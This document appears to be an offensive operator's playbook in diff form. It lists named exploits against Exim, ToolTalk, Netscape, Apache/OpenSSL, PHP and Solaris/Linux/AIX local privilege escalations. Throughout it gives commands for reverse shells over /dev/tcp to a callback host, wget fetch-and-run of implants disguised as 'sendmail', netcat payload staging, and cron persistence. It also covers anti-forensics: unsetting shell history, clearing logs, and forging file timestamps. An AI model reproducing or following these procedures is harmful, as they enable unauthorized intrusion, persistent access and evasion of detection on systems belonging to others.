+  -i <127.0.0.1>
+  -d </cgi-bin/awstats.pl> 
+  -p <port>
+  -e <exploit method>
+      0: ?pluginmode=:system("CMD");
+      1: ?configdir=|CMD|
+      2: ?update=1&logfile=|CMD|&framename=mainright
+  -c <Command to run on target>
+
+Examples:
+1) ./xp_awstats.pl -i http://127.0.0.1/cgi-bin/awstats.pl -e3 -c"uname -a;ls -la;w"
+2) ./xp_awstats.pl -i http://127.0.0.1/cgi-bin/awstats.pl -e3 -c"(mkdir /tmp/.scsi; cd /tmp/.scsi; /usr/bin/wget http://
+PITCH_IP:5555/sendmail -Osendmail;chmod +x sendmail;D=-cPITCH_IP:9999 PATH=. sendmail) 2>/dev/null"
+
+-nstun TARGET_IP:9999
+
+######################  ERRGENTLE ##########################
+#  exploits vulnerability Exim 3.22 thru Exim 3.35 Mail Transfer Agent
+#  brute force
+
+###### Version 3
+# Upload on PITCHIMPAIR and run
+netstat -an | grep LISTEN | grep 113
+
+mkdir /tmp/.scsi
+-cd /tmp/.scsi
+-put /current/bin/xp-exim-3-remote-solaris-v3 x
+
+-shell
+./x -i TARGET_IP -p 25 -d SCAPEGOAT_DOMAIN -u nobody -t
+# states if vulnerable; hit return to throw if vulnerable
+# takes about 1000 hits; scrolls fast; will get root prompt
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+id
+pwd
+# will put you in /usr/exim-3.33/spool
+PATH=. crond
+<ctrl><d>
+exit
+
+-rm /tmp/.scsi/x /tmp/.scsi
+
+
+# check /var/log/messages for audit message or PAM failed attempt,
+
+
+###### Version 2
+
+-tunnel
+l 25 TARGET_IP
+r 113
+r RANDOM_PORT
+
+# test susceptability:
+
+-scan mail TARGET_IP
+
+./xp-exim-3 -i 127.0.0.1 -p 25 -c "sh </dev/tcp/PITCH_IP/RANDOM_PORT >&0 2>&0" -t
+
+#  response should be something like:
+#  It's vulnerable!  Hit a key to start
+
+
+# change location of heap to point to other location using -l:
+
+./xp-exim-3 -i 127.0.0.1 -p 25 -t -l2 -c "sh </dev/tcp/PITCH_IP/RANDOM_PORT >&0 2>&0"
+
+# or
+
+(echo -e "HTTP/1.0 200\n";cat sendmail) | nc -vv -l -p RANDOM_PORT 
+
+# older versions of redhat cannot use /dev/tcp redirection, use wget; 
+
+./xp-exim-3  -i 127.0.0.1 -c "mkdir /tmp/.scsi; cd /tmp/.scsi; wget http://PITCH_IP:RANDOM_PORT/sendmail -osendmail;chmod +x sendmail*; PATH=. sendmail;PATH=. sendmail.1; PATH=. sendmail.2;" 
+
+##  clean logs
+# several entries in /usr/exim/spool/log/*
+# with something like unqualified sender rejected
+
+-lt /var/log/messages
+-lt /var/log/maillog
+-lt /usr/exim/spool/log
+-tail /usr/exim/spool/log/rejectlog
+-tail /usr/exim/spool/log/mainlog
+
+
+
+
+
+############################################
+# TOOLTALK      -DEC, IRIX, or Sol2.6 or earlier
+############################################
+
+-scan rpc TARGET_IP
+
+# look for     100083    1   tcp  30889  ttdbserverd
+
+rpcinfo -n TTDBSERVERD_PORT -t TARGET_IP PROG_NUM
+
+packrat pmgrd NETCAT_PORT
+
+#ex:./dec_tt.tn.gr 1 200.21.200.2  LOCAL_IP 25 /tmp/.advtags 30889
+./dec_tt.tn.gr 1 TARGET_IP LOCAL_IP NETCAT_PORT /tmp/WORK_DIR 30889
+
+
+
+
+################################################
+### VS - VIOLET
+### You need to do this exploit from a box very close (ideally on the same net) 
+### as the target because of the traffic it generates.
+### Reference the README file in /current/bin for help on the new version
+################################################
+#Start Xserver on local ops machine prior to logging in
+
+### VS version5
+xhost + <TARGET_IP or PITCH_IP>
+iptables -F
+netstat -an |grep 6000  (make sure local xserver is listening)
+
+
+
+### run the test version first to get the times (if vulnerable):
+-put /current/bin/vs.gettime.sol.sparc v
+rpcinfo -p TARGET_IP
+#Ex: ./v -i 202.83.160.51 -h ATMNMS -n 34647 -p 443
+./v -i TARGET_IP -h HOSTNAME -n TCP_PROGRAMPORT -p CALLBACK_PORT
+
+### hit return when prompted; once you get the times for the cookie
+### you can throw the attack thru the redirector 
+
+-rm v
+-cd /tmp
+-rm .scsi
+
+### set up the tunnels, using whichever ports you think can call back:
+-tunnel
+l TCP_PROGRAMPORT TARGET_IP
+r 8080 127.0.0.1 6000
+r 443
+
+
+### locally, send the exploit:
+./vs.attack.linux -i 127.0.0.1 -h HOSTNAME -x 8080 -c PITCH_IP -p 443 -n TCP_PROGRAMPORT -7(optional) -v 5 -T SECOND_FROM_GETTIME -t MICROSECS_FROM_GETTIME
+
+
+### a dtterm should eventually pop up - get that mouse outta the way; get those unsets ready!
+
+
+
+
+
+
+
+
+###old way:
+
+
+xhost + <TARGET_IP or PITCH_IP>
+iptables -F
+netstat -an |grep 6000  (make sure local xserver is listening)
+
+	#connect to redir (you'll need two windows, one for the tunnel, 
+	#one to run the exploit)
+
+	#create a working dir on redir
+	#upload nopen
+	#start nopen
+
+	#check if you'll need to elevate (hope to see superuser next to 
+	# vs port):
+rpcinfo targetIP   (no options)
+
+	#prepare vs.sparc command or vs.linux  (depending on OS of local 
+	# box or redir box)
+	#upload vs.sparc executable to redir
+	#create tunnel in nopen redir window 
+
+r 22222 127.0.0.1 6000
+
+  	#paste vs command into 2nd nopen window (on redir)
+-shell
+./vs.sparc -7 -v 5 -i IP -h name -D -q PITCH_IP -p tunnelport -n programport
+
+        #hit return when prompted and wait possibly a long time)
+        #keep mouse/cursor away from area where window may pop up
+        #watch tcpdump window
+
+	#when dtterm pops up, paste each command:
+w
+df -k
+
+	#hit return on netcat window
+	#create another tunnel to netcat 
+r 32177
+
+	#in dtterm, paste upload command
+
+	#be sure to allow enough time for upload to get past redir and 
+	# all the way to target
+
+controlC netcat
+
+	#from redir, attempt to connect to target w/ nopen
+
+	#if successful, paste "exit" in dtterm
+
+	#If not, may have to start in callback mode
+
+        #paste upload commands
+#./vs.linux -i target_ip -h hostname -r prog_num -v rpc_version -D -q local_ip -p 6000 -n ?
+
+ ./vs.linux -i  -h  -D -q  -p 6000 -v 5 -r  -n 52213
+
+mkdir /tmp/.scsi; cd /tmp/.scsi; telnet local_ip port </dev/console |uudecode; ls -al
+uncompress sendmail.Z; chmod +x sendmail; PATH=. sendmail
+
+###################################################3
+###  TTSESSION (rpcttjamsession)
+###################################################3
+
+###  pops a terminal back to your box
+
+
+### make sure Xserver is running locally (may need to restart box):
+netstat -an | grep 6000
+
+### Allow a window to pop up on your local display:
+xhost +
+
+### and maybe:
+        iptables -F
+
+
+### see if you'll need to elevate, see who is running that session:
+### superuser is golden
+
+-scan brpc TARGET_IP
+
+mx
+:%s/RANDOM_PORT/RANDOM1/g
+:%s/DISPLAY_PORT/RANDOM2/g
+:%s/TTSESSIONPROGNUM/TTSESSIONPROGNUM/g
+:%s/TTSESSIONPROGPORT/TTSESSIONPROGPORT/g
+`x
+
+###  Get your netcat ready
+packrat NETCAT_PORT
+
+
+### redirector
+-tunnel
+l RANDOM_PORT TARGET_IP TTSESSIONPROGPORT
+r DISPLAY_PORT 127.0.0.1 6000
+r NETCAT_PORT
+
+### use info from highest ttsession portinfo:
+# Usage:
+#./rpcttjamsession [-p port] [-r rpc_program] [-v rpc_version][-d display_ip] [-n display_port] [-c cookie_string] [-7] [-t] hostname
+#       -d display_ip - IP address to set DISPLAY
+#       -n display_port - redirection port for Xwindows, default is 6000.
+#       -t - test the RPC call, do not send message.
+#       -7 is for Solaris 7 default rpc program number
+#       -c - User's Cookie as a character string.
+# (-v = rpcversion from scan results)
+
+
+### REDIRECTED:
+#  Ex. - ./rpcttjamsession -d 203.135.28.242 -v 4 -n 22222 -p 32782 -r 1342177279 127.0.0.1
+./rpcttjamsession -d PITCH_IP -v RPCVERSION -n DISPLAY_PORT -p RANDOM_PORT -r TTSESSIONPROGRAMNUMBER 127.0.0.1
+
+### NO REDIRECTOR:
+./rpcttjamsession -d LOCAL_IP -v RPCVERSION -n 6000 -p TTSESSIONPROGPORT -r TTSESSIONPROGRAMNUMBER TARGET_IP
+
+
+### Be patient.  Check your tunnels and watch for activity in your tcpdump.
+### If all goes well, a target window will pop up in the left corner of your screen.
+### Paste commands in it and GET MOUSE OUT OF THE BOX (generatesmore traffic because of X)
+
+
+
+### get this ready for pasting:
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+        ### for foreign language problems try this to pop back another xterm in English:
+        echo $LANG
+        LANG=
+        export LANG
+        DISPLAY=PITCH_IP:RANDOM_1-6000
+        /usr/openwin/bin/xterm
+mkdir /tmp/.scsi; cd  /tmp/.scsi; pwd
+telnet PITCH_IP NETCAT_PORT | uudecode
+uncompress -f sendmail.Z
+chmod 0700 sendmail
+PATH=/tmp/.scsi sendmail
+
+ls -la /tmp/.scsi
+cd /tmp/.scsi; uncompress -f sendmail.Z
+
+
+### get that mouse out of the way
+
+
+### get on box with nopen:
+-nstun TARGET_IP
+
+
+
+### Cleanup:
+/var/dt/Xerrors
+/var/adm
+/.sh_history
+/.dt/startlog.old
+
+
+
+
+
+### In remaining local windows, connect to PI host, then connect to TARGET: ##########
+
+-rm sendmail
+
+### to PI host:
+cd /current/down
+../bin/noclient PITCH_IP:NETCAT_PORT
+
+### from PI host to TARGET:
+#-nstun TARGET_IP RAT_PORT
+	#-readrc ../etc/norc.osf1
+
+-nstun TARGET_IP RAT_PORT
+
+
+
+
+
+
+
+#########################################################
+# ENERGIZERBUNNY
+#########################################################
+# elevate to root: Sol 2.3-2.9
+
+-put /current/up/eb eb  
+-put /current/up/mod32 mod32
+# or -put /current/up/mod64 mod64 
+        
+./eb -h
+./eb [-k 32|64] [-p <pid>] [-u <uid>] [-g <gid>] [-n]
+
+./eb
+
+id
+
+### start a new nopen as root:
+PATH=. D=-lRANDOM sendmail
+
+-nstun TARGET_IP RANDOM
+
+-rm eb mod32
+
+#########################################################
+# WALNUTSMOOTHY
+#########################################################
+# elevate to root: Sol 2.5.1-2.8
+
+mkdir /tmp/1291aaab/
+-put /current/up/efs f
+cp f /tmp/1291aaab
+
+-shell
+cd /tmp/1291aaab
+pwd
+./f
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+
+id
+cd /tmp/.scsi
+
+head /etc/passwd
+
+### start a new nopen as root while in -shell:
+PATH=. D=-lRANDOM sendmail
+exit
+
+### connect to privileged nopen:
+-nstun TARGET_IP RANDOM
+
+### burn unprivileged nopen
+
+### cleanup files
+-rm /tmp/1291aaab/f f sendmail
+-rm /tmp/1291aaab
+-lt /tmp
+
+
+#########################################################
+# EXTREMEPARR
+#########################################################
+# elevate to root: Sol 2.6-2.9
+
+###
+### make sure this exists:
+-ls /usr/dt/bin/dtappgather
+
+### Upload the proper version
+-cd /tmp/.scsi
+-put /current/up/exp.x.tar.Z b.tar.Z
+uncompress b.tar.Z
+tar -xf b.tar
+
+### Find a setuid root program to use for the exploit
+### The following should work:
+### 	w, ps -ef, at -l, whodo, who, and ls -al
+### Pick a program, determine the location, and verify setuid root is there
+###	(should see perms of -rwsr-xr-x)
+which at
+-ls /bin/at
+
+### Verify su is NOT in the locale directory already
+ls -al /usr/lib/locale/su
+
+### Rename the shared object to have the name of 'su' or whichever loacale you use instead
+### Be sure you use the correct version for the system's architecture
+cp su.so.2.789x su.so.2
+-ls -t
+
+
+### Have a copy of nopen in your working directory to start up once you get root:
+-put /current/up/noserver sendmail
+-ls
+
+### Insert the local shared object /usr/lib/locale by running the following
+### This will also generate itime commands to use later when cleaning up,
+### normal error messages, and an indication of the success/failure of th
+### insertion of the object into /usr/lib/locale
+./exp su
+echo "" | at now + 180 mins
+
+### Set up your variables
+-getenv
+-setenv LC_TIME=su
+-getenv
+at -l
+-shell
+LC_TIME=su
+export LC_TIME
+at -l
+id
+pwd
+cd /tmp/.scsi
+PATH=. sendmail
+exit
+exit
+
+### Connect from pitch to new noserver that has root privileges
+-nstun TARGET_IP
+
+
+### Burn your unprivileged nopen session and connect agin to new noserver
+-burn
+-nstun TARGET_IP
+
+
+### Cleanup
+at -l
+at -r 1085530072.a
+at -l
+ls -al /.sh_history
+-ls -t /
+ls -lart /usr/lib/locale
+rm /usr/lib/locale/su/*
+rmdir /usr/lib/locale/su
+-lt /usr/lib/locale
+ls -al /usr/lib | grep locale
+ls -al /var/dt/appconfig | grep appmanager
+ls -al /var/dt | grep appconfig
+chmod 755 /usr/lib/locale
+chmod 755 /var/dt/appconfig/appmanager
+chmod 755 /var/dt/appconfig
+chown bin:bin /usr/lib/locale
+chown root:root /var/dt/appconfig/appmanager /var/dt/appconfig
+ls -al /usr/lib | grep locale
+ls -al /var/dt/appconfig | grep appmanager
+ls -al /var/dt | grep appconfig
+-touch /usr/lib/localedef /usr/lib/locale
+-w
+-ls -t
+id
+-w
+-ls
+-ls -t /usr/lib/locale
+-ls -t /usr/lib/locale/iso_8859_1
+-ls -t /usr/lib/locale/iso_8859_1/LC_CTYPE
+-touch /usr/lib/locale/iso_8859_1 /usr/lib/locale/.
+touch -r /usr/lib/locale/iso_8859_1 /usr/lib/locale/.
+-ls -t /usr/lib/locale
+ls -al /var/dt/appconfig | grep appmanager
+ls -al /var/dt | grep appconfig
+-ls -t /var/dt/
+-ls -t /var/dt/appconfig
+touch -r /var/dt/. /var/dt/appconfig/appmanager
+touch -r /var/dt/. /var/dt/appconfig/.
+-ls -t /var/dt/appconfig
+-ls -t /var/dt/
+
+### Clean up directory
+-ls -t
+-rm sendmail empty su.so.2 b.tar exp su.so.2.789x su.so.2.6x
+-ls -t
+
+### Check crontabs  and logs if you used 'at'
+-ls -t /var/adm
+-ls -t /var/spool/cron
+-ls -t /var/spool/cron/atjobs
+touch -r /var/spool/cron/crontabs /var/spool/cron/atjobs
+-tail -40 /var/cron/log
+
+### Toast and sgrep your initial exploit
+
+
+#######################################
+### EVENTSTART
+#######################################
+
+### might reboot box on first try; after the reboot, it should work
+### if you exploited an http service (like w/ EMBERSNOUT) make sure that
+###     service is started upon reboot; RH9.0 doesn't restart http by default
+###     unless the admin changed the config
+
+
+### verify http is restarted at reboot:
+-ls -t /etc/init.d
+-ls -t /etc/rc.d/rc3.d
+-ls  /etc/rc.d/rc*.d/*htt*
+chkconfig --list |grep htt
+runlevel
+
+
+### start a cron job to call nopen in case of a reboot (if you won't be able to reexploit)
+### set the time to remove itself to the next hour (use both local and UTC time)
+
+vi /current/down/crontab:
+0,5,10,15,20,25,30,35,40,45,50,55 * * * * sh -c "D=-cPITCH_IP:PORT /tmp/.httpd-lock/crond"
+0 1,17 * * * crontab -r
+
+### on target:
+date; date -u
+-ls -t /var/log/cron
+-ls -t /var/spool/cron
+-cat /etc/syslog.conf
+crontab -l
+-put /current/down/crontab crontab
+-cat crontab
+crontab crontab
+crontab -l
+date
+
+
+
+### upload eventstart:
+-put /current/up/h h
+
+-shell
+unset HISTFILE
+unset HISTFILESIZE
+unset HISTSIZE
+id
+pwd
+ls -l
+PATH=. sendmail
+exit
+exit
+
+
+### remove crontab after you elevate (or reboot - haha!)
+crontab -r
+
+#######################################
+# PTRACE/FORKPTY
+#######################################
+
+### new exploit is ptrace-kmod; it's a kernel exploit, no suid needed.
+### works on linux 2.2 -> 2.4, ex) RH8.0 and MDK 9.0
+### might have to run it twice before it works.
+### other ptraces are older and need to run against a setuid program that won't log
+###     like /usr/sbin/usernetctl, /usr/sbin/userhelper, or /usr/sbin/traceroute
+# find / -fstype nfs -prune -o -type f \( -perm -4000 \) -user root -ls > o
+# get o
+
+#### get ptrace, forkpty, and nopen tarball ready to send:
+cd /current/up
+cp ptrace<TAB> pt
+cp noserver sendmail
+cp forkpty fp
+tar cvf 1u.tar pt sendmail fp
+uuencode 1u.tar 1u.tar > 1u.tar.uu
+
+nc -l -p NETCAT_PORT < 1u.tar.uu
+
+#### to elevate and also get nopen there:
+cd /tmp
+mkdir .scsi
+cd .scsi
+telnet LOCAL_IP NETCAT_PORT > src
+      Connection closed by foreign host.
+ls -la
+uudecode src
+ls -la
+tar xvf 1u.tar
+ls -la
+chmod 700 fp sendmail pt
+./fp
+
+#### at sh-prompt, type:
+tty
+./pt
+unset HISTFILE
+unset HISTSIZE
+unset HISTFILESIZE
+id
+PATH=. sendmail
+
+
+########################################
+# TFTPD - upload image to router
+########################################
+
+
+### get on redirector with nopen
+
+mkdir /tmp/.scsi
+chmod 777 /tmp/.scsi
+-cd /tmp/.scsi
+-put ../up/tftpd_clean sched
+
+### name the image EXACTLY how it will appear on the target - get tech guidance
+
+-put image image.name
+chmod 777 image.name
+
+### start tftpd listener
+#Example ./sched -l -a 10.0.0.14 -s /tmp/.scsi
+# the -a IP option is the PITCH IP that talks to the router (if multiple interfaces)
+
+-shell
+./sched -l -a PITCH_IP -s /tmp/.scsi
+DONE
+exit
+
+-rm image.name sched
+-cd /tmp
+-rm /tmp/.scsi
+-lt
+
+
+########################################
+# SAMPLEMAN / ROUTER TOUCH
+########################################
+
+
+### redir
+-tunnel
+l 2323 TARGET_IP 23
+
+
+### Locally:
+telnet 127.0.0.1 2323
+
+# userid = <>
+# passwd = <>
+
+term length 0
+sh user
+sh ver
+sh arp
+sh ip rout
+sh proc cpu
+enable
+#  enable password = <>
+sh run
+sh start
+sh cdp neighbo detail
+sh flash all
+# use the chart to figure out mem location for the next command if applicable
+sh mem <address> 
+logout
+
+########################################
+# ENGAGENAUGHTY
+########################################
+# Apache and SSL exploit on Linux on Dec ALpha
+# ssl must be OpenSSL 0.9.6d or earlier
+
+
+Usage: ./apache-ssl-linux-alpha <-i hostname> [-t arch] [-p port] [-n <connections>] [-a 0x<address>]
+  -t <arch>          target architecture (default is 00)
+  -p <port>          SSL port (default is 443)
+  -a 0x<address>     the free location found via objdump
+  -n <N>             open N apache connections before sending the shellcode (default is 20)
+  -m <N>             maximum number of open connections (default is 50)
+  -v                 verbose mode
+
+  -c                 command to run (default is "ls > /tmp/ls".)Supported architectures:
+
+target archs:
+00 - RedHat Linux 7.0 Apache/1.3.12 (Unix)  (Red Hat/Linux) mod_ssl/2.6.6 OpenSSL/0.9.5a
+
+Examples: ./apache-ssl-linux-alpha -a 10 -v localhost
+          ./apache-ssl-linux-alpha -p 1234 192.168.0.1 -n 40 -m 80 
+
+ examples of commands: 
+1. xterm: /usr/X11R6/bin/xterm -display 1.1.1.1:0 -e /bin/sh 
+2. wget:  First: echo -e "HTTP/1.0 200\n" > new; cat new noserver-2.6.1-i586.pc.linux.gnu.redhat-5.0 > sendmail; nc -v -l -p 53 < sendmail
+    then: cd /tmp;wget http://1.1.1.1:53/sendmail; chmod +x /tmp/sendmail;PATH=/tmp sendmail;rm -f sendmail
+3. xinetd (watch for logging): echo -e "service squid\n{\nsocket_type = stream\nwait = no\nuser = apache\nserver = /bin/sh\n}" > /tmp/.scsi; /usr/sbin/xinetd -f /tmp/.scsi
+
+
+
+scan ssl TARGET_IP
+
+### scripted window
+nc -l -vv -p RANDOWM
+
+-tunnel
+l 11443 TARGET_IP 443
+r RANDOM
+
+
+
+./apache-ssl-linux-alpha -i PITCH_IP -p SSL_PORT -v -c "(sh</dev/tcp/PITCH_IP/NETCAT_PORT>&0 2>&0)"
+        # or for ksh:
+./apache-ssl-linux-alpha -i PITCH_IP -p SSL_PORT -v -c  "(ksh -c "sh </dev/tcp/PITCH_IP/NETCAT_PORT >&0 2>&0")"
+
+xhost +
+-tunnel
+r 6006 127.0.0.1 6000
+
+### This one pops back an xterm (be patient for it to pop back and keep mouse clear of window):
+./apache-ssl-linux-alpha -i PITCH_IP -p SSL_PORT -v -c  "/usr/bin/X11/xterm -display PITCH_IP:6 -e /bin/sh"
+
+### Cleaning:
+/var/log/httpd/error_log
+
+
+############################################################################
+# EXPLOITRETURN
+# redflag 2.0 and redhat 9.0 running PHP
+# found in cgi-bin for sybil build
+
+-scan http TARGET_IP
+HTTP/1.1 200 OK
+Date: Wed, 25 Feb 2004 22:02:11 GMT
+Server: Apache/1.3.12 (Unix)  (Black Cat/Linux) mod_ssl/2.6.4 OpenSSL/0.9.5a PHP/4.0.0 rus/PL29.4
+
+-tunnel
+l 80 TARGET_IP
+# choose 79, 5555 
+r 79
+ or
+r 5555
+
+telnet 127.0.0.1 80
+GET /HTTP/1.0
+
+telnet 127.0.0.1 80
+GET /ppd/product_user/reg_edu.php HTTP/1.0
+# hit return twice
+#response looking for:  HTTP/1.1 302 Found
+
+# do not use option 1 or 4 since it brings inconsistent results
+xp_server 
+# uuencoded rat
+uuencode sendmail sendmail > sendmail.uu
+nc -l -v -p 79 < sendmail.uu
+
+./xp_serial -i127.0.0.1 -p80 -d"/ppd/product_user/reg_edu.php" -l PITCH_IP -n79 -t3
+
+        or 
+
+# no uuencode of rat
+nc -l -v -p 5555 < sendmail
+./xp_serial -i127.0.0.1 -p80 -d"/ppd/product_user/reg_edu.php" -l PITCH_IP -n5555 -t2
+# after rat upload, <ctrl><c> nc command
+
+-nstun TARGET_IP
+# will be nobody - need to elevate with ptrace or other 
+# need to clean the following logs
+/var/log/httpd/error_log
+/var/log/httpd/access_log
+
+
+
+#####################################################
+# EGGBASKET
+#####################################################
+
+# Remote exploit against the Netscape Web Server which leverages
+#  a buffer overflow to obtain remote access
+
+# Netscape Enterprise/3.6 and Netscape Enterprise/3.6 SP1
+# works against AIMC Netscape servers also with right versions
+
+# Netscape-Enterprise 3.6:
+#       solaris 2.6(sun4m only), sun4u & sun4m solaris 2.7 - 2.9
+
+# Netscape-Enterprise/3.6 SP1:
+#       sun4m solaris 2.8, sun4m & sun4u solaris 2.9
+
+#  need local to elevate such as SMOOTHY and EXTREMEPARR
+
+# Verify version of Netscape if target did not change version string
+
+-scan http TARGET_IP
+
+# from redirector
+-tunnel
+l 80 TARGET_IP
+
+# locally
+
+nc 127.0.0.1 80
+GET / HTTP/1.0
+<return>
+<return>
+
+# on redirector
+-tunnel
+l 80 TARGET_IP
+r RANDOM_HIGH_PORT1
+
+# locally window1, successful exploit will call back here with a shell if
+# your -c command tells it to.
+nc -vv -l -p RANDOM_HIGH_PORT1
+
+#  Usage:  xp_ns-httpd
+
+# i7 - program counter, location we are jumping to;   fp - stack location;  04 - where our code is
+
+Targets: <version>     <architecture>                                i7         fp        o4
+ Version:  01: Netscape-Enterprise/3.6/sun4u/5.8/fire115/aimc    0xff2a2a74 0xff2e6270 0x13ab60
+ Version:  02: Netscape-Enterprise/3.6/sun4m/5.8/theora/aimc     0xef722a74 0xef766270 0x13a360
+ Version:  03: Netscape-Enterprise/3.6/sun4m/5.8/unixtest-4/aimc 0xef6e2a74 0xef726270 0x13a060
+ Version:  04: Netscape-Enterprise/3.6/sun4u/5.8/unixtest-1/aimc 0xff2a2a74 0xff2e6270 0x13a160
+ Version:  05: Netscape-Enterprise/3.6/sun4u/5.8/fire121/aimc    0xff2a2a74 0xff2e6270 0x13ab60
+ Version:  06: Netscape-Enterprise/3.6/sun4m/5.8/arc/aimc        0xef6e2a74 0xef726270 0x139d60
+ Version:  07: Netscape-Enterprise/3.6/sun4u/5.7/baltimore/aimc  0xff2a2a74 0xff2e6270 0x13a360
+ Version:  08: Netscape-Enterprise/3.6/sun4u/5.7/grandmama/aimc  0xff2a2a74 0xff2e6270 0x13a260
+ Version:  09: Netscape-Enterprise/3.6/sun4m/5.7/unixtest-3/aimc 0xef722a74 0xef766270 0x139360
+ Version:  10: Netscape-Enterprise/3.6/sun4m/5.6/elsa/aimc       0xef722a74 0xef766270 0x13a060
+ Version:  11: Netscape-Enterprise/3.6/sun4m/5.6/gazoo/aimc      0xef722a74 0xef766270 0x13a060
+ Version:  12: Netscape-Enterprise/3.6/sun4m/5.6/loneranger/aimc 0xef722a74 0xef766270 0x139360
+ Version:  13: Netscape-Enterprise/3.6/sun4u/5.9/fire108/aimc    0xff2a2a74 0xff2e6270 0x139f60
+ Version:  14: Netscape-Enterprise/3.6/sun4m/5.9/mack/aimc       0xef6e2a74 0xef726270 0x139d60
+ Version:  15: Netscape-Enterprise/3.6/sun4u/5.9/thing/aimc      0xff2a2a74 0xff2e6270 0x139f60
+ Version:  16: Netscape-Enterprise/3.6/sun4u/5.9/thing           0xff2a2a74 0xff2e6270 0x155090
+ Version:  17: Netscape-Enterprise/3.6/sun4u/5.9/fire117         0xff2a2a74 0xff2e6270 0x155090
+ Version:  18: Netscape-Enterprise/3.6/sun4m/5.6/loneranger      0xef722a74 0xef766270 0x153f78
+ Version:  19: Netscape-Enterprise/3.6/sun4u/5.9/thing           0xff2a2a74 0xff2e6270 0x155290
+ Version:  19: Netscape-Enterprise/3.6/sun4u/5.8/blade1000       0xff2a2a74 0xff2e6270 0x155f90
+ Version:  20: Netscape-Enterprise/3.6sp1/sun4u/5.9/thing        0xff2a2c64 0xff2e6750 0x155390
+ Version:  21: Netscape-Enterprise/3.6sp1/sun4m/5.8/theora       0xef722c64 0xef766750 0x155390
+ Version:  22: Netscape-Enterprise/3.6sp1/sun4m/5.9/mack         0xef6e2c64 0xef726750 0x155090
+
+
+#   -f      webpath: usually just /
+#   -c      command: "(ksh -c \"sh </dev/tcp/1.1.1.1/22222 >&0 2>&0\")&"
+#   -7      i7: have seen  0xff2a2a74, 0xef722a74, 0xef6e2a74
+#   -6      sp: these work 0xff2e6270, 0xef766270, 0xef726270
+#   -4      o4: <default 0x155090>, have seen 0x153090, when running AIMC, use 0x139360
+#   -d      destination target
+#   -p      port: <default: 80>
+#   -s      sleep number of seconds between requests <default: 7>
+#   -h      usage
+#   -x      range in the heap. <default: 32>
+#   -i      heap increment. <default: 0x100> another good one to try is 0x80
+
+# locally window2
+# NOTE: Once you have evidence that the exploit worked (say your shell calls back),
+#       you can ^C in the exploit window to stop it spinning.
+
+# Example 1 assumes default install:
+
+Example 1: xp_ns-httpd -f / -c "(ksh -c \"sh </dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1 >&0 2>&0\")&" -d 127.0.0.1 -p 80
+
+# Example 2, Netscape was installed with AIMC:
+
+      Example 2, AIMC box: xp_ns-httpd -f / -c "(ksh -c \"sh </dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1 >&0 2>&0\")&" -d 127.0.0.1 -p 80 -4 0
+x139360 -s 10 -x 64
+
+      Example 3, low level mode: xp_ns-httpd -f / -c "(ksh -c \"sh </dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1 >&0 2>&0\")&" -7 0xff2a2a74 -6 
+0xff2e6270 -d 127.0.0.1 -p 80 -4 0x13a960 -s 10 -x 16
+
+# Example 4, Netscape 3.6 SP1:
+
+      Example 4, SP1: xp_ns-httpd -f / -c "(ksh -c \"sh </dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1 >&0 2>&0\")&" -7 0xff2a2c64 -6 0xff2e6750 
+-d 127.0.0.1 -p 80
+
+# Example 5, a busy Netscape 3.6 SP1:
+
+      Example 5: retry, but faster and more complete: xp_ns-httpd -f / -c "(ksh
+-c \"sh </dev/tcp/PITCH_IP/RANDOM_HIGH_PORT1 >&0 2>&0\")&" -d 127.0.0.1 -s 5 -i
+0x80
+
+
+# Give troubleshooting instructions:
+#  There are five steps in troubleshooting EGGBASKET v2:
+#  Determine if the webserver is running Netscape-Enterprise 3.6 or 3.6 SP1.
+          # nc 127.0.0.1 80
+             GET / HTTP/1.0
+             <return>
+             <return>
+
+# Determine the OS based upon touch information or MAC address.
+
+# Maybe the server is busy serving requests, therefore try the
+
+#  following additional options:
+
+       -s 5 -i 0x80
+
+# Maybe try a wider range in hitting the NOP sled, then try the
+#  following additional options:
+
+            -x 64 -4 0x139360 # AIMC
+
+            or
+
+            -x 64 -4 0x153090 # Normal install
+
+# Is the target running the AIMC version, then try the following additional option:
+
+       -4 0x139360
+
+# The line "Errorlog" in $SERVERROOTDIR/config/magnus.conf tells where logging
+#  occurs
+
+# If the exploit fails, it is logged as such:
+
+# [18/Mar/2002:08:59:38] info (23834): successful server startup
+# [18/Mar/2002:08:59:38] info (23834): Netscape-Enterprise/3.6 SP1 B99.036.2117
+# [18/Mar/2002:08:59:38] verbose (23834): livewireInit reports: Starting Server-Side JavaScript build: 99.036.2332
+
+######################  EXCEEDSALON-AIX #####################
+##  local elevation for AIX
+##  does not log but check anyway
+#  elevation as user
+mkdir /tmp/.pci
+cd /tmp/.pci
+# use ftshell, uudecode copy/paste, telnet/nc, or wget to put
+#  /current/up/xp_lquerypv-aix5.1 up as s
+./s
+
+#  elevation in nopen
+
+mkdir /tmp/.pci
+-cd /tmp/.pci
+-put /current/up/xp_lquerypv-aix5.1 s
+-shell
+id
+(user)
+./s
+id
+(euid=root)
+./sendmail
+/tmp/exit
+
+######################  ESTOPFORBADE #####################
+#  local root elevation against gds_inet_server under
+#  Cobalt Linux release 6.0
+#  for complexpuzzle
+
+# on target from nopen
+-lt /usr/local/sbin/gds_inet_server
+mkdir /tmp/.pci
+-cd /tmp/.pci
+pwd
+-put /current/up/xp_gds_inet_server g
+-shell
+id
+./g
+unset HISTSIZE
+unset HISTFILESIZE
+unset HISTFILE
+id
+
+#  try up to 2 times for elevation
+
+#####################################################
+# ENTERSEED
+#####################################################
+#
+# Apparently, 30 or so minutes and you can bail...no joy.
+#
+## Set up redirector
+-tunnel
+l 2500 TARGET_IP 25
+r NETCAT_PORT 127.0.0.1 NETCAT_PORT
+
+
+## set up a netcat listener in a local scripted window
+## to upload a STATICALLY COMPILED NOPEN
+nc -l -v -p NETCAT_PORT < noserver-static
+
+## LOCALLY in another window: OPTIONAL: Alert to show we hit
+while [ 1 ] ; do netstat -an | grep NETCAT_PORT.*LISTEN || break ; sleep 2 ; done ; beeps 3333
+
+## run exploit in a local scripted window
+#Usage: ./enterseed.py <target-ip> <target-port> <callback-ip> <callback-port> <platform> [-search<scale>] [-u<valid-username>] [-fuploaded-filename]
+#Platforms       1: SuSE 9.0 RPM (postfix-2.0.14-41)
